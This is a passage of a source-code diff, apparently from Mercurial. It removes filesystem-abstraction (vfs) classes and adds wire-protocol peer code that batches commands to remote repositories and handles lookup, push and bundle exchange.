+        # This looks like it will infinitely recurse. However,
+        # sendcommands() should modify __class__. This call serves as a check
+        # on that.
+        return self.result(timeout)
+
+
+@interfaceutil.implementer(repository.ipeercommandexecutor)
+class peerexecutor:
+    def __init__(self, peer):
+        self._peer = peer
+        self._sent = False
+        self._closed = False
+        self._calls = []
+        self._futures = weakref.WeakSet()
+        self._responseexecutor = None
+        self._responsef = None
 
-    def exists(self, path: Optional[bytes] = None) -> bool:
-        return os.path.exists(self.join(path))
+    def __enter__(self):
+        return self
 
-    def fstat(self, fp):
-        return util.fstat(fp)
+    def __exit__(self, exctype, excvalee, exctb):
+        self.close()
 
-    def isdir(self, path: Optional[bytes] = None) -> bool:
-        return os.path.isdir(self.join(path))
+    def callcommand(self, command, args):
+        if self._sent:
+            raise error.ProgrammingError(
+                b'callcommand() cannot be used after commands are sent'
+            )
 
-    def isfile(self, path: Optional[bytes] = None) -> bool:
-        return os.path.isfile(self.join(path))
+        if self._closed:
+            raise error.ProgrammingError(
+                b'callcommand() cannot be used after close()'
+            )
 
-    def islink(self, path: Optional[bytes] = None) -> bool:
-        return os.path.islink(self.join(path))
+        # Commands are dispatched through methods on the peer.
+        fn = getattr(self._peer, pycompat.sysstr(command), None)
 
-    def isfileorlink(self, path: Optional[bytes] = None) -> bool:
-        """return whether path is a regular file or a symlink
+        if not fn:
+            raise error.ProgrammingError(
+                b'cannot call command %s: method of same name not available '
+                b'on peer' % command
+            )
 
-        Unlike isfile, this doesn't follow symlinks."""
-        try:
-            st = self.lstat(path)
-        except OSError:
-            return False
-        mode = st.st_mode
-        return stat.S_ISREG(mode) or stat.S_ISLNK(mode)
-
-    def _join(self, *paths: bytes) -> bytes:
-        root_idx = 0
-        for idx, p in enumerate(paths):
-            if os.path.isabs(p) or p.startswith(self._dir_sep):
-                root_idx = idx
-        if root_idx != 0:
-            paths = paths[root_idx:]
-        paths = [p for p in paths if p]
-        return self._dir_sep.join(paths)
-
-    def reljoin(self, *paths: bytes) -> bytes:
-        """join various elements of a path together (as os.path.join would do)
-
-        The vfs base is not injected so that path stay relative. This exists
-        to allow handling of strange encoding if needed."""
-        return self._join(*paths)
-
-    def split(self, path: bytes):
-        """split top-most element of a path (as os.path.split would do)
-
-        This exists to allow handling of strange encoding if needed."""
-        return os.path.split(path)
-
-    def lexists(self, path: Optional[bytes] = None) -> bool:
-        return os.path.lexists(self.join(path))
-
-    def lstat(self, path: Optional[bytes] = None):
-        return os.lstat(self.join(path))
-
-    def listdir(self, path: Optional[bytes] = None):
-        return os.listdir(self.join(path))
-
-    def makedir(self, path: Optional[bytes] = None, notindexed=True):
-        return util.makedir(self.join(path), notindexed)
-
-    def makedirs(
-        self, path: Optional[bytes] = None, mode: Optional[int] = None
-    ):
-        return util.makedirs(self.join(path), mode)
-
-    def makelock(self, info, path: bytes):
-        return util.makelock(info, self.join(path))
-
-    def mkdir(self, path: Optional[bytes] = None):
-        return os.mkdir(self.join(path))
-
-    def mkstemp(
-        self,
-        suffix: bytes = b'',
-        prefix: bytes = b'tmp',
-        dir: Optional[bytes] = None,
-    ):
-        fd, name = pycompat.mkstemp(
-            suffix=suffix, prefix=prefix, dir=self.join(dir)
-        )
-        dname, fname = util.split(name)
-        if dir:
-            return fd, os.path.join(dir, fname)
+        # Commands are either batchable or they aren't. If a command
+        # isn't batchable, we send it immediately because the executor
+        # can no longer accept new commands after a non-batchable command.
+        # If a command is batchable, we queue it for later. But we have
+        # to account for the case of a non-batchable command arriving after
+        # a batchable one and refuse to service it.
+
+        def addcall():
+            f = futures.Future()
+            self._futures.add(f)
+            self._calls.append((command, args, fn, f))
+            return f
+
+        if getattr(fn, 'batchable', False):
+            f = addcall()
+
+            # But since we don't issue it immediately, we wrap its result()
+            # to trigger sending so we avoid deadlocks.
+            f.__class__ = unsentfuture
+            f._peerexecutor = self
         else:
-            return fd, fname
-
-    def readdir(self, path: Optional[bytes] = None, stat=None, skip=None):
-        return util.listdir(self.join(path), stat, skip)
-
-    def readlock(self, path: bytes) -> bytes:
-        return util.readlock(self.join(path))
-
-    def rename(self, src: bytes, dst: bytes, checkambig=False):
-        """Rename from src to dst
-
-        checkambig argument is used with util.filestat, and is useful
-        only if destination file is guarded by any lock
-        (e.g. repo.lock or repo.wlock).
-
-        To avoid file stat ambiguity forcibly, checkambig=True involves
-        copying ``src`` file, if it is owned by another. Therefore, use
-        checkambig=True only in limited cases (see also issue5418 and
-        issue5584 for detail).
-        """
-        self._auditpath(dst, b'w')
-        srcpath = self.join(src)
-        dstpath = self.join(dst)
-        oldstat = checkambig and util.filestat.frompath(dstpath)
-        if oldstat and oldstat.stat:
-            ret = util.rename(srcpath, dstpath)
-            _avoidambig(dstpath, oldstat)
-            return ret
-        return util.rename(srcpath, dstpath)
-
-    def readlink(self, path: bytes) -> bytes:
-        return util.readlink(self.join(path))
-
-    def removedirs(self, path: Optional[bytes] = None):
-        """Remove a leaf directory and all empty intermediate ones"""
-        return util.removedirs(self.join(path))
-
-    def rmdir(self, path: Optional[bytes] = None):
-        """Remove an empty directory."""
-        return os.rmdir(self.join(path))
-
-    def rmtree(
-        self, path: Optional[bytes] = None, ignore_errors=False, forcibly=False
-    ):
-        """Remove a directory tree recursively
-
-        If ``forcibly``, this tries to remove READ-ONLY files, too.
-        """
-        if forcibly:
-
-            def onerror(function, path, excinfo):
-                if function is not os.remove:
-                    raise
-                # read-only files cannot be unlinked under Windows
-                s = os.stat(path)
-                if (s.st_mode & stat.S_IWRITE) != 0:
-                    raise
-                os.chmod(path, stat.S_IMODE(s.st_mode) | stat.S_IWRITE)
-                os.remove(path)
+            if self._calls:
+                raise error.ProgrammingError(
+                    b'%s is not batchable and cannot be called on a command '
+                    b'executor along with other commands' % command
+                )
 
-        else:
-            onerror = None
-        return shutil.rmtree(
-            self.join(path), ignore_errors=ignore_errors, onerror=onerror
-        )
+            f = addcall()
 
-    def setflags(self, path: bytes, l: bool, x: bool):
-        return util.setflags(self.join(path), l, x)
+            # Non-batchable commands can never coexist with another command
+            # in this executor. So send the command immediately.
+            self.sendcommands()
 
-    def stat(self, path: Optional[bytes] = None):
-        return os.stat(self.join(path))
+        return f
 
-    def unlink(self, path: Optional[bytes] = None):
-        return util.unlink(self.join(path))
+    def sendcommands(self):
+        if self._sent:
+            return
 
-    def tryunlink(self, path: Optional[bytes] = None):
-        """Attempt to remove a file, ignoring missing file errors."""
-        util.tryunlink(self.join(path))
-
-    def unlinkpath(
-        self, path: Optional[bytes] = None, ignoremissing=False, rmdir=True
-    ):
-        return util.unlinkpath(
-            self.join(path), ignoremissing=ignoremissing, rmdir=rmdir
-        )
+        if not self._calls:
+            return
 
-    def utime(self, path: Optional[bytes] = None, t=None):
-        return os.utime(self.join(path), t)
+        self._sent = True
 
-    def walk(self, path: Optional[bytes] = None, onerror=None):
-        """Yield (dirpath, dirs, files) tuple for each directories under path
+        # Unhack any future types so caller seens a clean type and to break
+        # cycle between us and futures.
+        for f in self._futures:
+            if isinstance(f, unsentfuture):
+                f.__class__ = futures.Future
+                f._peerexecutor = None
+
+        calls = self._calls
+        # Mainly to destroy references to futures.
+        self._calls = None
+
+        # Simple case of a single command. We call it synchronously.
+        if len(calls) == 1:
+            command, args, fn, f = calls[0]
+
+            # Future was cancelled. Ignore it.
+            if not f.set_running_or_notify_cancel():
+                return
 
-        ``dirpath`` is relative one from the root of this vfs. This
-        uses ``os.sep`` as path separator, even you specify POSIX
-        style ``path``.
+            try:
+                result = fn(**pycompat.strkwargs(args))
+            except Exception:
+                pycompat.future_set_exception_info(f, sys.exc_info()[1:])
+            else:
+                f.set_result(result)
 
-        "The root of this vfs" is represented as empty ``dirpath``.
-        """
-        root = os.path.normpath(self.join(None))
-        # when dirpath == root, dirpath[prefixlen:] becomes empty
-        # because len(dirpath) < prefixlen.
-        prefixlen = len(pathutil.normasprefix(root))
-        for dirpath, dirs, files in os.walk(self.join(path), onerror=onerror):
-            yield (dirpath[prefixlen:], dirs, files)
-
-    @contextlib.contextmanager
-    def backgroundclosing(self, ui, expectedcount=-1):
-        """Allow files to be closed asynchronously.
-
-        When this context manager is active, ``backgroundclose`` can be passed
-        to ``__call__``/``open`` to result in the file possibly being closed
-        asynchronously, on a background thread.
-        """
-        # Sharing backgroundfilecloser between threads is complex and using
-        # multiple instances puts us at risk of running out of file descriptors
-        # only allow to use backgroundfilecloser when in main thread.
-        if not isinstance(
-            threading.current_thread(),
-            threading._MainThread,  # pytype: disable=module-attr
-        ):
-            yield
             return
-        vfs = getattr(self, 'vfs', self)
-        if getattr(vfs, '_backgroundfilecloser', None):
-            raise error.Abort(
-                _(b'can only have 1 active background file closer')
-            )
 
-        with backgroundfilecloser(ui, expectedcount=expectedcount) as bfc:
+        # Batch commands are a bit harder. First, we have to deal with the
+        # @batchable coroutine. That's a bit annoying. Furthermore, we also
+        # need to preserve streaming. i.e. it should be possible for the
+        # futures to resolve as data is coming in off the wire without having
+        # to wait for the final byte of the final response. We do this by
+        # spinning up a thread to read the responses.
+
+        requests = []
+        states = []
+
+        for command, args, fn, f in calls:
+            # Future was cancelled. Ignore it.
+            if not f.set_running_or_notify_cancel():
+                continue
+
             try:
-                vfs._backgroundfilecloser = (
-                    bfc  # pytype: disable=attribute-error
-                )
-                yield bfc
-            finally:
-                vfs._backgroundfilecloser = (
-                    None  # pytype: disable=attribute-error
+                encoded_args_or_res, decode = fn.batchable(
+                    fn.__self__, **pycompat.strkwargs(args)
                 )
+            except Exception:
+                pycompat.future_set_exception_info(f, sys.exc_info()[1:])
+                return
+
+            if not decode:
+                f.set_result(encoded_args_or_res)
+            else:
+                requests.append((command, encoded_args_or_res))
+                states.append((command, f, batchable, decode))
 
-    def register_file(self, path):
-        """generic hook point to lets fncache steer its stew"""
+        if not requests:
+            return
 
+        # This will emit responses in order they were executed.
+        wireresults = self._peer._submitbatch(requests)
 
-class vfs(abstractvfs):
-    """Operate files relative to a base directory
+        # The use of a thread pool executor here is a bit weird for something
+        # that only spins up a single thread. However, thread management is
+        # hard and it is easy to encounter race conditions, deadlocks, etc.
+        # concurrent.futures already solves these problems and its thread pool
+        # executor has minimal overhead. So we use it.
+        self._responseexecutor = futures.ThreadPoolExecutor(1)
+        self._responsef = self._responseexecutor.submit(
+            self._readbatchresponse, states, wireresults
+        )
 
-    This class is used to hide the details of COW semantics and
-    remote file access from higher level code.
+    def close(self):
+        self.sendcommands()
 
-    'cacheaudited' should be enabled only if (a) vfs object is short-lived, or
-    (b) the base directory is managed by hg and considered sort-of append-only.
-    See pathutil.pathauditor() for details.
-    """
+        if self._closed:
+            return
 
-    def __init__(
-        self,
-        base: bytes,
-        audit=True,
-        cacheaudited=False,
-        expandpath=False,
-        realpath=False,
-    ):
-        if expandpath:
-            base = util.expandpath(base)
-        if realpath:
-            base = os.path.realpath(base)
-        self.base = base
-        self._audit = audit
-        if audit:
-            self.audit = pathutil.pathauditor(self.base, cached=cacheaudited)
-        else:
-            self.audit = lambda path, mode=None: True
-        self.createmode = None
-        self._trustnlink = None
-        self.options = {}
-
-    @util.propertycache
-    def _cansymlink(self) -> bool:
-        return util.checklink(self.base)
-
-    @util.propertycache
-    def _chmod(self):
-        return util.checkexec(self.base)
+        self._closed = True
 
-    def _fixfilemode(self, name):
-        if self.createmode is None or not self._chmod:
+        if not self._responsef:
             return
-        os.chmod(name, self.createmode & 0o666)
-
-    def _auditpath(self, path, mode) -> None:
-        if self._audit:
-            if os.path.isabs(path) and path.startswith(self.base):
-                path = os.path.relpath(path, self.base)
-            r = util.checkosfilename(path)
-            if r:
-                raise error.Abort(b"%s: %r" % (r, path))
-            self.audit(path, mode=mode)
-
-    def isfileorlink_checkdir(
-        self, dircache, path: Optional[bytes] = None
-    ) -> bool:
-        """return True if the path is a regular file or a symlink and
-        the directories along the path are "normal", that is
-        not symlinks or nested hg repositories.
 
-        Ignores the `_audit` setting, and checks the directories regardless.
-        `dircache` is used to cache the directory checks.
-        """
+        # We need to wait on our in-flight response and then shut down the
+        # executor once we have a result.
         try:
-            for prefix in pathutil.finddirs_rev_noroot(util.localpath(path)):
-                if prefix in dircache:
-                    res = dircache[prefix]
-                else:
-                    res = pathutil.pathauditor._checkfs_exists(
-                        self.base, prefix, path
+            self._responsef.result()
+        finally:
+            self._responseexecutor.shutdown(wait=True)
+            self._responsef = None
+            self._responseexecutor = None
+
+            # If any of our futures are still in progress, mark them as
+            # errored. Otherwise a result() could wait indefinitely.
+            for f in self._futures:
+                if not f.done():
+                    f.set_exception(
+                        error.ResponseError(
+                            _(b'unfulfilled batch command response'), None
+                        )
                     )
-                    dircache[prefix] = res
-                if not res:
-                    return False
-        except (OSError, error.Abort):
-            return False
-        return self.isfileorlink(path)
-
-    def __call__(
-        self,
-        path: bytes,
-        mode: bytes = b"rb",
-        atomictemp=False,
-        notindexed=False,
-        backgroundclose=False,
-        checkambig=False,
-        auditpath=True,
-        makeparentdirs=True,
-    ):
-        """Open ``path`` file, which is relative to vfs root.
-
-        By default, parent directories are created as needed. Newly created
-        directories are marked as "not to be indexed by the content indexing
-        service", if ``notindexed`` is specified for "write" mode access.
-        Set ``makeparentdirs=False`` to not create directories implicitly.
-
-        If ``backgroundclose`` is passed, the file may be closed asynchronously.
-        It can only be used if the ``self.backgroundclosing()`` context manager
-        is active. This should only be specified if the following criteria hold:
-
-        1. There is a potential for writing thousands of files. Unless you
-           are writing thousands of files, the performance benefits of
-           asynchronously closing files is not realized.
-        2. Files are opened exactly once for the ``backgroundclosing``
-           active duration and are therefore free of race conditions between
-           closing a file on a background thread and reopening it. (If the
-           file were opened multiple times, there could be unflushed data
-           because the original file handle hasn't been flushed/closed yet.)
-
-        ``checkambig`` argument is passed to atomictempfile (valid
-        only for writing), and is useful only if target file is
-        guarded by any lock (e.g. repo.lock or repo.wlock).
-
-        To avoid file stat ambiguity forcibly, checkambig=True involves
-        copying ``path`` file opened in "append" mode (e.g. for
-        truncation), if it is owned by another. Therefore, use
-        combination of append mode and checkambig=True only in limited
-        cases (see also issue5418 and issue5584 for detail).
-        """
-        if auditpath:
-            self._auditpath(path, mode)
-        f = self.join(path)
-
-        if b"b" not in mode:
-            mode += b"b"  # for that other OS
-
-        nlink = -1
-        if mode not in (b'r', b'rb'):
-            dirname, basename = util.split(f)
-            # If basename is empty, then the path is malformed because it points
-            # to a directory. Let the posixfile() call below raise IOError.
-            if basename:
-                if atomictemp:
-                    if makeparentdirs:
-                        util.makedirs(dirname, self.createmode, notindexed)
-                    return util.atomictempfile(
-                        f, mode, self.createmode, checkambig=checkambig
-                    )
-                try:
-                    if b'w' in mode:
-                        util.unlink(f)
-                        nlink = 0
-                    else:
-                        # nlinks() may behave differently for files on Windows
-                        # shares if the file is open.
-                        with util.posixfile(f):
-                            nlink = util.nlinks(f)
-                            if nlink < 1:
-                                nlink = 2  # force mktempcopy (issue1922)
-                except FileNotFoundError:
-                    nlink = 0
-                    if makeparentdirs:
-                        util.makedirs(dirname, self.createmode, notindexed)
-                if nlink > 0:
-                    if self._trustnlink is None:
-                        self._trustnlink = nlink > 1 or util.checknlink(f)
-                    if nlink > 1 or not self._trustnlink:
-                        util.rename(util.mktempcopy(f), f)
-        fp = util.posixfile(f, mode)
-        if nlink == 0:
-            self._fixfilemode(f)
-
-        if checkambig:
-            if mode in (b'r', b'rb'):
-                raise error.Abort(
-                    _(
-                        b'implementation error: mode %s is not'
-                        b' valid for checkambig=True'
-                    )
-                    % mode
-                )
-            fp = checkambigatclosing(fp)
 
-        if backgroundclose and isinstance(
-            threading.current_thread(),
-            threading._MainThread,  # pytype: disable=module-attr
-        ):
-            if (
-                not self._backgroundfilecloser  # pytype: disable=attribute-error
-            ):
-                raise error.Abort(
-                    _(
-                        b'backgroundclose can only be used when a '
-                        b'backgroundclosing context manager is active'
-                    )
-                )
-
-            fp = delayclosedfile(
-                fp,
-                self._backgroundfilecloser,  # pytype: disable=attribute-error
-            )
+            self._futures = None
 
-        return fp
+    def _readbatchresponse(self, states, wireresults):
+        # Executes in a thread to read data off the wire.
 
-    def symlink(self, src: bytes, dst: bytes) -> None:
-        self.audit(dst)
-        linkname = self.join(dst)
-        util.tryunlink(linkname)
-
-        util.makedirs(os.path.dirname(linkname), self.createmode)
-
-        if self._cansymlink:
+        for command, f, batchable, decode in states:
+            # Grab raw result off the wire and teach the internal future
+            # about it.
             try:
-                os.symlink(src, linkname)
-            except OSError as err:
-                raise OSError(
-                    err.errno,
-                    _(b'could not symlink to %r: %s')
-                    % (src, encoding.strtolocal(err.strerror)),
-                    linkname,
+                remoteresult = next(wireresults)
+            except StopIteration:
+                # This can happen in particular because next(batchable)
+                # in the previous iteration can call peer._abort, which
+                # may close the peer.
+                f.set_exception(
+                    error.ResponseError(
+                        _(b'unfulfilled batch command response'), None
+                    )
                 )
-        else:
-            self.write(dst, src)
-
-    def join(self, path: Optional[bytes], *insidef: bytes) -> bytes:
-        if path:
-            parts = [self.base, path]
-            parts.extend(insidef)
-            return self._join(*parts)
-        else:
-            return self.base
-
-
-opener = vfs
-
-
-class proxyvfs(abstractvfs):
-    def __init__(self, vfs: "vfs"):
-        self.vfs = vfs
-
-    @property
-    def createmode(self):
-        return self.vfs.createmode
-
-    def _auditpath(self, path, mode):
-        return self.vfs._auditpath(path, mode)
-
-    @property
-    def options(self):
-        return self.vfs.options
-
-    @options.setter
-    def options(self, value):
-        self.vfs.options = value
-
-
-class filtervfs(proxyvfs, abstractvfs):
-    '''Wrapper vfs for filtering filenames with a function.'''
-
-    def __init__(self, vfs: "vfs", filter):
-        proxyvfs.__init__(self, vfs)
-        self._filter = filter
-
-    def __call__(self, path: bytes, *args, **kwargs):
-        return self.vfs(self._filter(path), *args, **kwargs)
-
-    def join(self, path: Optional[bytes], *insidef: bytes) -> bytes:
-        if path:
-            return self.vfs.join(self._filter(self.vfs.reljoin(path, *insidef)))
-        else:
-            return self.vfs.join(path)
-
-
-filteropener = filtervfs
-
-
-class readonlyvfs(proxyvfs):
-    '''Wrapper vfs preventing any writing.'''
-
-    def __init__(self, vfs: "vfs"):
-        proxyvfs.__init__(self, vfs)
-
-    def __call__(self, path: bytes, mode: bytes = b'rb', *args, **kw):
-        if mode not in (b'r', b'rb'):
-            raise error.Abort(_(b'this vfs is read only'))
-        return self.vfs(path, mode, *args, **kw)
+            else:
+                try:
+                    result = decode(remoteresult)
+                except Exception:
+                    pycompat.future_set_exception_info(f, sys.exc_info()[1:])
+                else:
+                    f.set_result(result)
 
-    def join(self, path: Optional[bytes], *insidef: bytes) -> bytes:
-        return self.vfs.join(path, *insidef)
 
+@interfaceutil.implementer(
+    repository.ipeercommands, repository.ipeerlegacycommands
+)
+class wirepeer(repository.peer):
+    """Client-side interface for communicating with a peer repository.
 
-class closewrapbase:
-    """Base class of wrapper, which hooks closing
+    Methods commonly call wire protocol commands of the same name.
 
-    Do not instantiate outside of the vfs layer.
+    See also httppeer.py and sshpeer.py for protocol-specific
+    implementations of this interface.
     """
 
-    def __init__(self, fh):
-        object.__setattr__(self, '_origfh', fh)
-
-    def __getattr__(self, attr):
-        return getattr(self._origfh, attr)
+    def commandexecutor(self):
+        return peerexecutor(self)
 
-    def __setattr__(self, attr, value):
-        return setattr(self._origfh, attr, value)
-
-    def __delattr__(self, attr):
-        return delattr(self._origfh, attr)
-
-    def __enter__(self):
-        self._origfh.__enter__()
-        return self
+    # Begin of ipeercommands interface.
 
-    def __exit__(self, exc_type, exc_value, exc_tb):
-        raise NotImplementedError('attempted instantiating ' + str(type(self)))
-
-    def close(self):
-        raise NotImplementedError('attempted instantiating ' + str(type(self)))
-
-
-class delayclosedfile(closewrapbase):
-    """Proxy for a file object whose close is delayed.
-
-    Do not instantiate outside of the vfs layer.
-    """
-
-    def __init__(self, fh, closer):
-        super(delayclosedfile, self).__init__(fh)
-        object.__setattr__(self, '_closer', closer)
+    def clonebundles(self):
+        self.requirecap(b'clonebundles', _(b'clone bundles'))
+        return self._call(b'clonebundles')
+
+    @batchable
+    def lookup(self, key):
+        self.requirecap(b'lookup', _(b'look up remote revision'))
+
+        def decode(d):
+            success, data = d[:-1].split(b" ", 1)
+            if int(success):
+                return bin(data)
+            else:
+                self._abort(error.RepoError(data))
+
+        return {b'key': encoding.fromlocal(key)}, decode
+
+    @batchable
+    def heads(self):
+        def decode(d):
+            try:
+                return wireprototypes.decodelist(d[:-1])
+            except ValueError:
+                self._abort(error.ResponseError(_(b"unexpected response:"), d))
+
+        return {}, decode
+
+    @batchable
+    def known(self, nodes):
+        def decode(d):
+            try:
+                return [bool(int(b)) for b in pycompat.iterbytestr(d)]
+            except ValueError:
+                self._abort(error.ResponseError(_(b"unexpected response:"), d))
+
+        return {b'nodes': wireprototypes.encodelist(nodes)}, decode
+
+    @batchable
+    def branchmap(self):
+        def decode(d):
+            try:
+                branchmap = {}
+                for branchpart in d.splitlines():
+                    branchname, branchheads = branchpart.split(b' ', 1)
+                    branchname = encoding.tolocal(urlreq.unquote(branchname))
+                    branchheads = wireprototypes.decodelist(branchheads)
+                    branchmap[branchname] = branchheads
+                return branchmap
+            except TypeError:
+                self._abort(error.ResponseError(_(b"unexpected response:"), d))
+
+        return {}, decode
+
+    @batchable
+    def listkeys(self, namespace):
+        if not self.capable(b'pushkey'):
+            return {}, None
+        self.ui.debug(b'preparing listkeys for "%s"\n' % namespace)
+
+        def decode(d):
+            self.ui.debug(
+                b'received listkey for "%s": %i bytes\n' % (namespace, len(d))
+            )
+            return pushkeymod.decodekeys(d)
 
-    def __exit__(self, exc_type, exc_value, exc_tb):
-        self._closer.close(self._origfh)
+        return {b'namespace': encoding.fromlocal(namespace)}, decode
 
-    def close(self):
-        self._closer.close(self._origfh)
+    @batchable
+    def pushkey(self, namespace, key, old, new):
+        if not self.capable(b'pushkey'):
+            return False, None
+        self.ui.debug(b'preparing pushkey for "%s:%s"\n' % (namespace, key))
 
+        def decode(d):
+            d, output = d.split(b'\n', 1)
+            try:
+                d = bool(int(d))
+            except ValueError:
+                raise error.ResponseError(
+                    _(b'push failed (unexpected response):'), d
+                )
+            for l in output.splitlines(True):
+                self.ui.status(_(b'remote: '), l)
+            return d
+
+        return {
+            b'namespace': encoding.fromlocal(namespace),
+            b'key': encoding.fromlocal(key),
+            b'old': encoding.fromlocal(old),
+            b'new': encoding.fromlocal(new),
+        }, decode
+
+    def stream_out(self):
+        return self._callstream(b'stream_out')
+
+    def getbundle(self, source, **kwargs):
+        kwargs = pycompat.byteskwargs(kwargs)
+        self.requirecap(b'getbundle', _(b'look up remote changes'))
+        opts = {}
+        bundlecaps = kwargs.get(b'bundlecaps') or set()
+        for key, value in kwargs.items():
+            if value is None:
+                continue
+            keytype = wireprototypes.GETBUNDLE_ARGUMENTS.get(key)
+            if keytype is None:
+                raise error.ProgrammingError(
+                    b'Unexpectedly None keytype for key %s' % key
+                )
+            elif keytype == b'nodes':
+                value = wireprototypes.encodelist(value)
+            elif keytype == b'csv':
+                value = b','.join(value)
+            elif keytype == b'scsv':
+                value = b','.join(sorted(value))
+            elif keytype == b'boolean':
+                value = b'%i' % bool(value)
+            elif keytype != b'plain':
+                raise KeyError(b'unknown getbundle option type %s' % keytype)
+            opts[key] = value
+        f = self._callcompressable(b"getbundle", **pycompat.strkwargs(opts))
+        if any((cap.startswith(b'HG2') for cap in bundlecaps)):
+            return bundle2.getunbundler(self.ui, f)
+        else:
+            return changegroupmod.cg1unpacker(f, b'UN')
 
-class backgroundfilecloser:
-    """Coordinates background closing of file handles on multiple threads."""
+    def unbundle(self, bundle, heads, url):
+        """Send cg (a readable file-like object representing the
+        changegroup to push, typically a chunkbuffer object) to the
+        remote server as a bundle.
 
-    def __init__(self, ui, expectedcount=-1):
-        self._running = False
-        self._entered = False
-        self._threads = []
-        self._threadexception = None
+        When pushing a bundle10 stream, return an integer indicating the
+        result of the push (see changegroup.apply()).
 
-        # Only Windows/NTFS has slow file closing. So only enable by default
-        # on that platform. But allow to be enabled elsewhere for testing.
-        defaultenabled = pycompat.iswindows
-        enabled = ui.configbool(b'worker', b'backgroundclose', defaultenabled)
+        When pushing a bundle20 stream, return a bundle20 stream.
 
-        if not enabled:
-            return
+        `url` is the url the client thinks it's pushing to, which is
+        visible to hooks.
+        """
 
-        # There is overhead to starting and stopping the background threads.
-        # Don't do background processing unless the file count is large enough
-        # to justify it.
-        minfilecount = ui.configint(b'worker', b'backgroundcloseminfilecount')
-        # FUTURE dynamically start background threads after minfilecount closes.
-        # (We don't currently have any callers that don't know their file count)
-        if expectedcount > 0 and expectedcount < minfilecount:
-            return
+        if heads != [b'force'] and self.capable(b'unbundlehash'):
+            heads = wireprototypes.encodelist(
+                [b'hashed', hashutil.sha1(b''.join(sorted(heads))).digest()]
+            )
+        else:
+            heads = wireprototypes.encodelist(heads)
 
-        maxqueue = ui.configint(b'worker', b'backgroundclosemaxqueue')
-        threadcount = ui.configint(b'worker', b'backgroundclosethreadcount')
+        if util.safehasattr(bundle, b'deltaheader'):
+            # this a bundle10, do the old style call sequence
+            ret, output = self._callpush(b"unbundle", bundle, heads=heads)
+            if ret == b"":
+                raise error.ResponseError(_(b'push failed:'), output)
+            try:
+                ret = int(ret)
+            except ValueError:
+                raise error.ResponseError(
+                    _(b'push failed (unexpected response):'), ret
+                )
 
-        ui.debug(
-            b'starting %d threads for background file closing\n' % threadcount
+            for l in output.splitlines(True):
+                self.ui.status(_(b'remote: '), l)
+        else:
+            # bundle2 push. Send a stream, fetch a stream.
+            stream = self._calltwowaystream(b'unbundle', bundle, heads=heads)
+            ret = bundle2.getunbundler(self.ui, stream)
+        return ret
+
+    # End of ipeercommands interface.
+
+    # Begin of ipeerlegacycommands interface.
+
+    def branches(self, nodes):
+        n = wireprototypes.encodelist(nodes)
+        d = self._call(b"branches", nodes=n)
+        try:
+            br = [tuple(wireprototypes.decodelist(b)) for b in d.splitlines()]
+            return br
+        except ValueError:
+            self._abort(error.ResponseError(_(b"unexpected response:"), d))
+
+    def between(self, pairs):
+        batch = 8  # avoid giant requests
+        r = []
+        for i in range(0, len(pairs), batch):
+            n = b" ".join(
+                [
+                    wireprototypes.encodelist(p, b'-')
+                    for p in pairs[i : i + batch]
+                ]
+            )
+            d = self._call(b"between", pairs=n)
+            try:
+                r.extend(
+                    l and wireprototypes.decodelist(l) or []
+                    for l in d.splitlines()
+                )
+            except ValueError:
+                self._abort(error.ResponseError(_(b"unexpected response:"), d))
+        return r
+
+    def changegroup(self, nodes, source):
+        n = wireprototypes.encodelist(nodes)
+        f = self._callcompressable(b"changegroup", roots=n)
+        return changegroupmod.cg1unpacker(f, b'UN')
+
+    def changegroupsubset(self, bases, heads, source):
+        self.requirecap(b'changegroupsubset', _(b'look up remote changes'))
+        bases = wireprototypes.encodelist(bases)
+        heads = wireprototypes.encodelist(heads)
+        f = self._callcompressable(
+            b"changegroupsubset", bases=bases, heads=heads
         )
+        return changegroupmod.cg1unpacker(f, b'UN')
 
-        self._queue = pycompat.queue.Queue(maxsize=maxqueue)
-        self._running = True
+    # End of ipeerlegacycommands interface.
 
-        for i in range(threadcount):
-            t = threading.Thread(target=self._worker, name='backgroundcloser')
-            self._threads.append(t)
-            t.start()
+    def _submitbatch(self, req):
+        """run batch request <req> on the server
 
-    def __enter__(self):
-        self._entered = True
-        return self
+        Returns an iterator of the raw responses from the server.
+        """
+        ui = self.ui
+        if ui.debugflag and ui.configbool(b'devel', b'debug.peer-request'):
+            ui.debug(b'devel-peer-request: batched-content\n')
+            for op, args in req:
+                msg = b'devel-peer-request:    - %s (%d arguments)\n'
+                ui.debug(msg % (op, len(args)))
+
+        unescapearg = wireprototypes.unescapebatcharg
+
+        rsp = self._callstream(b"batch", cmds=encodebatchcmds(req))
+        chunk = rsp.read(1024)
+        work = [chunk]
+        while chunk:
+            while b';' not in chunk and chunk:
+                chunk = rsp.read(1024)
+                work.append(chunk)
+            merged = b''.join(work)
+            while b';' in merged:
+                one, merged = merged.split(b';', 1)
+                yield unescapearg(one)
+            chunk = rsp.read(1024)
+            work = [merged, chunk]
+        yield unescapearg(b''.join(work))
+
+    def _submitone(self, op, args):
+        return self._call(op, **pycompat.strkwargs(args))
+
+    def debugwireargs(self, one, two, three=None, four=None, five=None):
+        # don't pass optional arguments left at their default value
+        opts = {}
+        if three is not None:
+            opts['three'] = three
+        if four is not None:
+            opts['four'] = four
+        return self._call(b'debugwireargs', one=one, two=two, **opts)
+
+    def _call(self, cmd, **args):
+        """execute <cmd> on the server
+
+        The command is expected to return a simple string.
+
+        returns the server reply as a string."""
+        raise NotImplementedError()
+
+    def _callstream(self, cmd, **args):
+        """execute <cmd> on the server
+
+        The command is expected to return a stream. Note that if the
+        command doesn't return a stream, _callstream behaves
+        differently for ssh and http peers.
 
-    def __exit__(self, exc_type, exc_value, exc_tb):
-        self._running = False
+        returns the server reply as a file like object.
+        """
+        raise NotImplementedError()
 
-        # Wait for threads to finish closing so open files don't linger for
-        # longer than lifetime of context manager.
-        for t in self._threads:
-            t.join()
-
-    def _worker(self):
-        """Main routine for worker thread."""
-        while True:
-            try:
-                fh = self._queue.get(block=True, timeout=0.100)
-                # Need to catch or the thread will terminate and
-                # we could orphan file descriptors.
-                try:
-                    fh.close()
-                except Exception as e:
-                    # Stash so can re-raise from main thread later.
-                    self._threadexception = e
-            except pycompat.queue.Empty:
-                if not self._running:
-                    break
-
-    def close(self, fh):
-        """Schedule a file for closing."""
-        if not self._entered:
-            raise error.Abort(
-                _(b'can only call close() when context manager active')
-            )
+    def _callcompressable(self, cmd, **args):
+        """execute <cmd> on the server
 
-        # If a background thread encountered an exception, raise now so we fail
-        # fast. Otherwise we may potentially go on for minutes until the error
-        # is acted on.
-        if self._threadexception:
-            e = self._threadexception
-            self._threadexception = None
-            raise e
-
